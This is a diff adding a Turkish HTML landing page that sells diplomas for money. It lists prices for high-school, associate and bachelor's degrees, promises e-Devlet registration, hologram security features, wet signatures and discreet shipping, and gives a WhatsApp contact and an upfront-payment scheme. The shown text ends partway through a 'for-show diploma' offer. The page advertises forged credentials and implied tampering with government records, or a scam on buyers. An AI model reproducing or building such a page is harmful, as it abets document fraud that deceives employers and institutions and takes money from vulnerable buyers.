@@ -1,0 +1,1453 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎓</text></svg>">
+    <title>Parayla Diploma - E-Devlet Onaylı Diploma ve Göstermelik Diploma Danışmanlığı</title>
+    <meta name="description"
+        content="Parayla diploma almak mümkün mü? E-Devlet onaylı diploma danışmanlığı hizmeti. Lise, önlisans ve lisans diploma ücretleri. Taksit imkânı, güvenli kargo, 4-5 iş gününde e-Devlet kaydı. WhatsApp: 0554 592 45 69">
+    <meta name="keywords"
+        content="parayla diploma, e-devlet onaylı diploma, diploma fiyatları, lise diploması, önlisans diploması, lisans diploması, göstermelik diploma, diploma danışmanlığı">
+    <meta name="robots" content="index, follow">
+    <meta name="google-site-verification" content="8NBV14j7-Ymsr3lGOhZpc89qDuecEBy01AAO-AafceE" />
+    <meta name="google-site-verification" content="zBpdsKP2duoHahmFli8bLgvh5LHKImLll-hC0ZjMgds" />
+    <link rel="canonical" href="https://parayladiploma.github.io/">
+    <meta property="og:title" content="Parayla Diploma - E-Devlet Onaylı Diploma Danışmanlığı">
+    <meta property="og:description"
+        content="E-Devlet onaylı diploma danışmanlığı. Lise 8.000 TL, Önlisans 12.000 TL, Lisans 15.000 TL. WhatsApp: 0554 592 45 69">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://parayladiploma.github.io/">
+    <meta property="og:locale" content="tr_TR">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f1f5f9;
+            color: #1e293b;
+            line-height: 1.6;
+            padding-top: 52px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 16px;
+        }
+
+        /* Program kartları grid */
+        .programs-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+
+        /* Yorumlar grid */
+        .reviews-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+        }
+
+        /* İçerik bölümleri grid */
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+
+        /* Form wrapper */
+        .form-wrapper {
+            max-width: 720px;
+            margin: 0 auto;
+        }
+
+        /* Göstermelik kartı tam genişlik */
+        .gostermelik-card {
+            grid-column: 1 / -1;
+        }
+
+        /* Kart hover efekti */
+        .programs-grid>div {
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .programs-grid>div:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12) !important;
+        }
+
+        /* Review kart hover */
+        .reviews-grid>div {
+            transition: transform 0.2s;
+        }
+
+        .reviews-grid>div:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Tablet (768px+) */
+        @media (min-width: 768px) {
+            .container {
+                padding: 24px;
+            }
+
+            .programs-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .reviews-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .info-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .mobile-nav a {
+                font-size: 14px;
+                padding: 16px 12px;
+            }
+        }
+
+        /* Desktop (1024px+) */
+        @media (min-width: 1024px) {
+            .container {
+                padding: 32px;
+            }
+
+            .programs-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .reviews-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+
+            .mobile-nav {
+                justify-content: center;
+                gap: 0;
+            }
+
+            .mobile-nav a {
+                flex: unset;
+                padding: 16px 28px;
+                font-size: 15px;
+            }
+        }
+
+        /* Mobile Nav */
+        .mobile-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(135deg, #1e3a5f, #2563eb);
+            z-index: 999;
+            display: flex;
+            justify-content: space-around;
+            padding: 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .mobile-nav a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 14px 6px;
+            text-align: center;
+            flex: 1;
+            transition: background 0.2s;
+        }
+
+        .mobile-nav a:hover,
+        .mobile-nav a:active {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 15px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            background: #ffffff;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: #94a3b8;
+            margin-top: 3px;
+        }
+
+        .submit-btn {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-family: inherit;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .scroll-btn {
+            display: inline-block;
+            background: #2563eb;
+            color: #ffffff;
+            padding: 12px 28px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 15px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .scroll-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.3);
+        }
+
+        /* Abuse Modal */
+        .abuse-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .abuse-overlay.active {
+            display: flex;
+        }
+
+        .abuse-modal {
+            background: #fff;
+            border-radius: 12px;
+            padding: 28px;
+            max-width: 420px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+
+        .abuse-modal h4 {
+            margin: 0 0 4px 0;
+            color: #1e293b;
+            font-size: 18px;
+        }
+
+        .abuse-modal>div>p {
+            color: #64748b;
+            font-size: 13px;
+            margin: 0 0 16px 0;
+        }
+
+        .abuse-modal .close-btn {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 22px;
+            cursor: pointer;
+            color: #94a3b8;
+        }
+
+        .abuse-modal input,
+        .abuse-modal textarea {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            font-size: 14px;
+            margin-bottom: 10px;
+            font-family: inherit;
+        }
+
+        .abuse-modal textarea {
+            min-height: 70px;
+            resize: vertical;
+        }
+
+        .abuse-modal .abuse-submit {
+            width: 100%;
+            padding: 12px;
+            background: #dc2626;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .abuse-success {
+            text-align: center;
+            padding: 30px 10px;
+        }
+
+        .abuse-success .checkmark {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+
+        .abuse-success h4 {
+            color: #16a34a;
+            margin: 0 0 8px 0;
+        }
+
+        .abuse-success p {
+            color: #64748b;
+            font-size: 13px;
+        }
+    </style>
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "ProfessionalService",
+  "name": "Parayla Diploma Danışmanlığı",
+  "description": "E-Devlet onaylı diploma danışmanlığı hizmeti",
+  "telephone": "+905545924569",
+  "url": "https://parayladiploma.github.io",
+  "areaServed": "TR",
+  "availableLanguage": "tr"
+}
+</script>
+</head>
+
+<body>
+    <!-- MOBİL MENÜ -->
+    <nav class="mobile-nav">
+        <a href="#anasayfa">🏠 Ana Sayfa</a>
+        <a href="#basvuru-formu">📝 Talep Formu</a>
+        <a href="#yorumlar">⭐ Yorumlar</a>
+        <a href="https://api.whatsapp.com/send/?phone=905545924569&type=phone_number&app_absent=0">💬 WhatsApp</a>
+    </nav>
+
+    <div class="container">
+
+        <!-- HEADER -->
+        <div id="anasayfa"
+            style="background: linear-gradient(135deg, #1e3a5f, #2563eb, #3b82f6); padding: 40px 20px; text-align: center; border-radius: 12px; margin-bottom: 25px;">
+            <h1 style="color: #ffffff; font-size: 26px; margin: 0 0 10px 0; letter-spacing: 1px;">🎓 E-Devlet Onaylı
+                Diploma</h1>
+            <p style="color: #e0f2fe; font-size: 16px; margin: 0;">Sertifika ve diploma süreçleriniz için profesyonel
+                danışmanlık hizmeti</p>
+        </div>
+
+        <!-- WHATSAPP BANNER -->
+        <div
+            style="background: linear-gradient(135deg, #22c55e, #16a34a); padding: 16px 20px; border-radius: 10px; text-align: center; margin-bottom: 30px;">
+            <p style="margin: 0; color: #ffffff; font-size: 16px;">📞 <a
+                    href="https://api.whatsapp.com/send/?phone=905545924569&type=phone_number&app_absent=0"
+                    style="color: #ffffff; font-weight: bold; text-decoration: underline;">WhatsApp ile Hemen İletişime
+                    Geçin</a></p>
+        </div>
+
+        <!-- SEO MAKALE -->
+        <div
+            style="background: #ffffff; border-radius: 12px; padding: 24px; margin-bottom: 20px; border: 1px solid #e2e8f0;">
+            <h2 style="color: #1e3a5f; font-size: 20px; margin: 0 0 12px 0;">E-Devlet Onaylı Diploma Nedir? Parayla
+                Diploma Almak Mümkün Mü?</h2>
+            <p style="color: #475569; line-height: 1.7; margin: 0 0 12px 0;">E-devlet onaylı diploma, T.C.
+                Cumhurbaşkanlığı e-Devlet kapısı üzerinden doğrulanabilen, Yükseköğretim Bilgi Sistemi (YÖKSİS) veya
+                Milli Eğitim Bakanlığı kayıtlarında yer alan resmi eğitim belgesidir. Bu belge; iş başvurularında, kurum
+                içi yükselmelerde, lisansüstü eğitim başvurularında ve yurt dışı denklik süreçlerinde geçerli kabul
+                edilmektedir.</p>
+            <p style="color: #475569; line-height: 1.7; margin: 0 0 12px 0;"><strong>Parayla diploma</strong> araması
+                yapan kullanıcılar genellikle şu durumlardan birini yaşamaktadır:</p>
+            <ul style="color: #475569; line-height: 1.8; margin: 0 0 12px 20px;">
+                <li>Daha önce başladığı eğitimi yarıda bırakmış ve tamamlamak istiyor</li>
+                <li>Lise veya üniversite diplomasını kaybetmiş, yeniden çıkartmak istiyor</li>
+                <li>İş başvurularında veya terfi süreçlerinde diploma şartı ile karşılaşıyor</li>
+                <li>Yurt dışı çalışma veya göç süreçleri için resmi belgeye ihtiyaç duyuyor</li>
+                <li>Aile veya sosyal çevre baskısı nedeniyle göstermelik bir belge talep ediyor</li>
+            </ul>
+            <p style="color: #475569; line-height: 1.7; margin: 0;">Profesyonel diploma danışmanlığı hizmeti, bu
+                süreçlerin her birinde bireylere rehberlik ederek zaman kaybını önler ve resmi prosedürlerin doğru bir
+                şekilde takip edilmesini sağlar.</p>
+        </div>
+
+        <!-- SLOGAN -->
+        <div
+            style="background: linear-gradient(135deg, #0f172a, #1e293b); padding: 14px 20px; border-radius: 10px; text-align: center; margin-bottom: 20px;">
+            <p style="margin: 0; color: #fbbf24; font-size: 17px; font-weight: 700; letter-spacing: 0.5px;">👁️ Önce Gör
+                Taslağını, Sonra Ön Ödeme Yap!</p>
+        </div>
+
+        <!-- ADIM ADIM SÜREÇ -->
+        <div
+            style="background: #ffffff; border: 2px solid #e2e8f0; border-radius: 14px; padding: 24px 20px; margin-bottom: 24px; box-shadow: 0 4px 15px rgba(0,0,0,0.05);">
+            <h3 style="color: #1e3a5f; font-size: 20px; text-align: center; margin: 0 0 6px 0;">📋 Adım Adım Diploma
+                Alma Süreci</h3>
+            <p style="text-align: center; color: #64748b; font-size: 13px; margin: 0 0 20px 0;">Sürecimiz tamamen şeffaf
+                ve güvenlidir</p>
+
+            <!-- Adım 1 -->
+            <div style="display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start;">
+                <div
+                    style="width: 38px; height: 38px; min-width: 38px; background: linear-gradient(135deg, #2563eb, #3b82f6); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 800; font-size: 16px; box-shadow: 0 3px 10px rgba(37,99,235,0.3);">
+                    1</div>
+                <div>
+                    <p style="margin: 0 0 3px 0; font-weight: 700; color: #1e293b; font-size: 15px;">📝 Başvuru Formunu
+                        Doldurun</p>
+                    <p style="margin: 0; color: #64748b; font-size: 13px; line-height: 1.5;">Aşağıdaki formu doldurarak
+                        hangi diploma programını istediğinizi, kişisel bilgilerinizi ve tercihlerinizi bize iletirsiniz.
+                    </p>
+                </div>
+            </div>
+            <div style="width: 2px; height: 16px; background: #e2e8f0; margin: 0 0 18px 18px; border-radius: 2px;">
+            </div>
+
+            <!-- Adım 2 -->
+            <div style="display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start;">
+                <div
+                    style="width: 38px; height: 38px; min-width: 38px; background: linear-gradient(135deg, #0ea5e9, #38bdf8); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 800; font-size: 16px; box-shadow: 0 3px 10px rgba(14,165,233,0.3);">
+                    2</div>
+                <div>
+                    <p style="margin: 0 0 3px 0; font-weight: 700; color: #1e293b; font-size: 15px;">👁️ Taslak
+                        Diplomanızı İnceleyin</p>
+                    <p style="margin: 0; color: #64748b; font-size: 13px; line-height: 1.5;">Bilgilerinize göre
+                        hazırlanan diploma taslağını WhatsApp üzerinden size iletiyoruz. <strong>Önce görün,
+                            beğenin!</strong></p>
+                </div>
+            </div>
+            <div style="width: 2px; height: 16px; background: #e2e8f0; margin: 0 0 18px 18px; border-radius: 2px;">
+            </div>
+
+            <!-- Adım 3 -->
+            <div style="display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start;">
+                <div
+                    style="width: 38px; height: 38px; min-width: 38px; background: linear-gradient(135deg, #22c55e, #4ade80); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 800; font-size: 16px; box-shadow: 0 3px 10px rgba(34,197,94,0.3);">
+                    3</div>
+                <div>
+                    <p style="margin: 0 0 3px 0; font-weight: 700; color: #1e293b; font-size: 15px;">💳 Ön Ödeme (4.000
+                        TL)</p>
+                    <p style="margin: 0; color: #64748b; font-size: 13px; line-height: 1.5;">Taslağı onayladıktan sonra
+                        <strong>4.000 TL ön ödeme</strong> yaparsınız. Ödeme sonrası baskı sürecine geçilir.
+                    </p>
+                </div>
+            </div>
+            <div style="width: 2px; height: 16px; background: #e2e8f0; margin: 0 0 18px 18px; border-radius: 2px;">
+            </div>
+
+            <!-- Adım 4 -->
+            <div style="display: flex; gap: 14px; margin-bottom: 18px; align-items: flex-start;">
+                <div
+                    style="width: 38px; height: 38px; min-width: 38px; background: linear-gradient(135deg, #8b5cf6, #a78bfa); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 800; font-size: 16px; box-shadow: 0 3px 10px rgba(139,92,246,0.3);">
+                    4</div>
+                <div>
+                    <p style="margin: 0 0 3px 0; font-weight: 700; color: #1e293b; font-size: 15px;">🚚 Baskı, Kargo &
+                        E-Devlet Onayı</p>
+                    <p style="margin: 0; color: #64748b; font-size: 13px; line-height: 1.5;">Diplomanız profesyonel
+                        olarak basılır, adresinize <strong>kargo ile gönderilir</strong> ve <strong>E-Devlet
+                            onayı</strong> tamamlanır. Tüm süreci takip edebilirsiniz.</p>
+                </div>
+            </div>
+            <div style="width: 2px; height: 16px; background: #e2e8f0; margin: 0 0 18px 18px; border-radius: 2px;">
+            </div>
+
+            <!-- Adım 5 -->
+            <div style="display: flex; gap: 14px; align-items: flex-start;">
+                <div
+                    style="width: 38px; height: 38px; min-width: 38px; background: linear-gradient(135deg, #eab308, #facc15); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 800; font-size: 16px; box-shadow: 0 3px 10px rgba(234,179,8,0.3);">
+                    5</div>
+                <div>
+                    <p style="margin: 0 0 3px 0; font-weight: 700; color: #1e293b; font-size: 15px;">📅 Kalan Taksitleri
+                        Ödeyin</p>
+                    <p style="margin: 0; color: #64748b; font-size: 13px; line-height: 1.5;">Diplomanızı aldıktan sonra,
+                        programınızın toplam ücretine göre <strong>kalan bakiyeyi aylık taksitler halinde</strong>
+                        havale/EFT ile ödersiniz. Esnek ödeme imkânı!</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- GALERİ -->
+        <div style="margin-bottom: 30px;">
+            <h3 style="color: #1e3a5f; font-size: 18px; text-align: center; margin: 0 0 14px 0;">📸 Örnek Çalışmalarımız
+            </h3>
+            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;">
+                <img src="compressed-images/diploma-1.jpg" alt="Diploma örneği 1" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-2.jpg" alt="Diploma örneği 2" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-3.jpg" alt="Diploma örneği 3" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-4.jpg" alt="Diploma örneği 4" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-5.jpg" alt="Diploma örneği 5" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-6.jpg" alt="Diploma örneği 6" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-7.jpg" alt="Diploma örneği 7" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-8.jpg" alt="Diploma örneği 8" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-9.jpg" alt="Diploma örneği 9" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-10.jpg" alt="Diploma örneği 10" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-11.jpg" alt="Diploma örneği 11" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-12.jpg" alt="Diploma örneği 12" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-13.jpg" alt="Diploma örneği 13" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/edevlet-onayi.jpg" alt="E-Devlet onayı örneği" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+                <img src="compressed-images/diploma-ornek.jpg" alt="Diploma örneği" loading="lazy"
+                    onclick="openLightbox(this.src)"
+                    style="width:100%; border-radius:8px; cursor:pointer; transition: transform 0.2s; aspect-ratio:4/3; object-fit:cover;">
+            </div>
+        </div>
+
+        <!-- LIGHTBOX -->
+        <div id="lightbox" onclick="closeLightbox()"
+            style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.9); z-index:9999; align-items:center; justify-content:center; cursor:pointer;">
+            <img id="lightboxImg" src="" alt="Büyük görsel"
+                style="max-width:90%; max-height:90%; border-radius:12px; box-shadow: 0 10px 40px rgba(0,0,0,0.5);">
+            <div style="position:absolute; top:16px; right:20px; color:#fff; font-size:32px; font-weight:bold;">✕</div>
+        </div>
+
+        <hr style="border: none; border-top: 2px solid #e5e7eb; margin: 30px 0;">
+
+        <div
+            style="background: linear-gradient(135deg, #0f172a, #1e293b, #0f172a); border-radius: 14px; padding: 22px 20px; margin-bottom: 20px; box-shadow: 0 8px 32px rgba(15,23,42,0.25); border: 1px solid rgba(255,255,255,0.08);">
+            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 14px;">
+                <div
+                    style="width: 36px; height: 36px; background: linear-gradient(135deg, #ef4444, #dc2626); border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 18px;">
+                    🛡️</div>
+                <div>
+                    <p style="margin: 0; color: #f87171; font-size: 14px; font-weight: 700; letter-spacing: 0.3px;">
+                        Dolandırıcılara Dikkat!</p>
+                    <p style="margin: 2px 0 0 0; color: #94a3b8; font-size: 11px;">İnternette sponsorlu reklam vererek
+                        sizleri manipüle etmek isteyen kişilere karşı dikkatli olun.</p>
+                </div>
+            </div>
+            <p style="margin: 0 0 12px 0; color: #cbd5e1; font-size: 12px; line-height: 1.6;">Google'da arama
+                yaptığınızda aşağıdaki gibi <span
+                    style="background: rgba(239,68,68,0.15); color: #fca5a5; padding: 1px 6px; border-radius: 4px; font-weight: 600; font-size: 11px;">Ücretli
+                    sponsorlu reklam</span> ibaresi taşıyan sonuçlara güvenmeyin:</p>
+            <div
+                style="background: #ffffff; border-radius: 10px; padding: 14px 16px; font-family: Arial, sans-serif; position: relative; box-shadow: 0 2px 12px rgba(0,0,0,0.08);">
+                <div
+                    style="position: absolute; top: -8px; right: 12px; background: #ef4444; color: #fff; font-size: 9px; font-weight: 700; padding: 3px 8px; border-radius: 4px; letter-spacing: 0.5px;">
+                    ÖRNEK</div>
+                <div style="font-size: 11px; color: #202124; font-weight: 700; margin-bottom: 8px;">Ücretli sponsorlu
+                    reklam</div>
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">
+                    <div
+                        style="width: 22px; height: 22px; background: linear-gradient(135deg, #e8eaed, #d1d5db); border-radius: 50%; flex-shrink: 0;">
+                    </div>
+                    <div>
+                        <div style="font-size: 12px; color: #202124; font-weight: 500;">sahte-diploma-sitesi.online
+                        </div>
+                        <div style="font-size: 10px; color: #4d5156;">https://www.sahte-diploma-sitesi.online</div>
+                    </div>
+                </div>
+                <div style="font-size: 16px; color: #1a0dab; margin-bottom: 4px;">E-Devlet Onaylı Diploma</div>
+                <div style="font-size: 12px; color: #4d5156; line-height: 1.5;">Noter Onaylı Diploma Destek Al — Uzman
+                    kadromuzla yanınızdayız.</div>
+                <div style="font-size: 11px; color: #4d5156; margin-top: 3px;"><span
+                        style="font-weight: 700; color: #202124;">Fırsat:</span> İlk Danışmanlık için <span
+                        style="text-decoration: line-through;">₺10.000</span> indirim</div>
+                <!-- Kırmızı çarpı overlay -->
+                <div
+                    style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 64px; color: rgba(239,68,68,0.18); font-weight: 900; pointer-events: none;">
+                    ✕</div>
+            </div>
+            <div
+                style="margin-top: 12px; background: linear-gradient(135deg, rgba(239,68,68,0.15), rgba(220,38,38,0.1)); border-radius: 8px; padding: 8px 12px; text-align: center;">
+                <p style="margin: 0; color: #fca5a5; font-size: 12px; font-weight: 700;">🚫 Bu tarz sponsorlu reklamlara
+                    para kaptırmayın! Yalnızca bize ulaşın.</p>
+            </div>
+        </div>
+
+        <div class="programs-grid">
+            <!-- ========== LİSANS ========== -->
+            <div
+                style="background: #ffffff; border: 2px solid #2563eb; border-radius: 12px; padding: 24px; box-shadow: 0 4px 15px rgba(37,99,235,0.1);">
+                <h3 style="color: #1e3a5f; font-size: 22px; margin: 0 0 6px 0;">🎓 Lisans Programı</h3>
+                <p style="color: #2563eb; font-size: 24px; font-weight: bold; margin: 8px 0 16px 0;">15.000 TL</p>
+                <ul style="list-style: none; padding: 0; margin: 0 0 16px 0;">
+                    <li style="padding: 6px 0; color: #374151;">✅ 4.000 TL peşin, kalan tutar 4 ay taksit imkânı</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ E-Devlet ve okul sisteminde kayıtlı resmi görünürlük
+                    </li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Kabartma işlemeli belge, ıslak imza ve soğuk mühür
+                    </li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Orijinal hologram güvenlik özellikleri</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Transcript ve noter tasdiki desteği</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Türkiye geneline ücretsiz, gizli paket kargo</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ E-Devlete eklenme süresi ortalama 4-5 iş günüdür</li>
+                </ul>
+                <p style="margin: 0;"><a href="#basvuru-formu" onclick="selectProgram('Lisans')" class="scroll-btn">📝
+                        Formu
+                        Doldur, Başvuruyu Başlat</a></p>
+            </div>
+
+            <!-- ========== ÖNLİSANS ========== -->
+            <div
+                style="background: #ffffff; border: 2px solid #0ea5e9; border-radius: 12px; padding: 24px; box-shadow: 0 4px 15px rgba(14,165,233,0.1);">
+                <h3 style="color: #0c4a6e; font-size: 22px; margin: 0 0 6px 0;">📘 Önlisans Programı</h3>
+                <p style="color: #0ea5e9; font-size: 24px; font-weight: bold; margin: 8px 0 16px 0;">12.000 TL</p>
+                <ul style="list-style: none; padding: 0; margin: 0 0 16px 0;">
+                    <li style="padding: 6px 0; color: #374151;">✅ 4.000 TL peşin, kalan tutar 3 ay taksit imkânı</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ E-Devlet ve okul sisteminde kayıtlı resmi görünürlük
+                    </li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Kabartma işlemeli belge, ıslak imza ve soğuk mühür
+                    </li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Orijinal hologram güvenlik özellikleri</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Transcript ve noter tasdiki desteği</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Türkiye geneline ücretsiz, gizli paket kargo</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ E-Devlete eklenme süresi ortalama 4-5 iş günüdür</li>
+                </ul>
+                <p style="margin: 0;"><a href="#basvuru-formu" onclick="selectProgram('Önlisans')" class="scroll-btn">📝
+                        Formu Doldur, Başvuruyu Başlat</a></p>
+            </div>
+
+            <!-- ========== LİSE ========== -->
+            <div
+                style="background: #ffffff; border: 2px solid #8b5cf6; border-radius: 12px; padding: 24px; box-shadow: 0 4px 15px rgba(139,92,246,0.1);">
+                <h3 style="color: #4c1d95; font-size: 22px; margin: 0 0 6px 0;">📗 Lise Programı</h3>
+                <p style="color: #8b5cf6; font-size: 24px; font-weight: bold; margin: 8px 0 16px 0;">8.000 TL</p>
+                <ul style="list-style: none; padding: 0; margin: 0 0 16px 0;">
+                    <li style="padding: 6px 0; color: #374151;">✅ 4.000 TL peşin, kalan tutar 1 ay sonra ödeme</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ E-Devlet ve okul sisteminde kayıtlı resmi görünürlük
+                    </li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Kabartma işlemeli belge, ıslak imza ve soğuk mühür
+                    </li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Orijinal hologram güvenlik özellikleri</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Transcript ve noter tasdiki desteği</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ Türkiye geneline ücretsiz, gizli paket kargo</li>
+                    <li style="padding: 6px 0; color: #374151;">✅ E-Devlete eklenme süresi ortalama 4-5 iş günüdür</li>
+                </ul>
+                <p style="margin: 0;"><a href="#basvuru-formu" onclick="selectProgram('Lise')" class="scroll-btn">📝
+                        Formu
+                        Doldur, Başvuruyu Başlat</a></p>
+            </div>
+
+            <!-- ========== GÖSTERMELİK ========== -->
+            <div class="gostermelik-card"
+                style="background: linear-gradient(135deg, #fefce8, #fef9c3); border: 2px solid #eab308; border-radius: 12px; padding: 24px; box-shadow: 0 4px 15px rgba(234,179,8,0.1);">
+                <h3 style="color: #713f12; font-size: 22px; margin: 0 0 6px 0;">🏅 Göstermelik Diploma</h3>
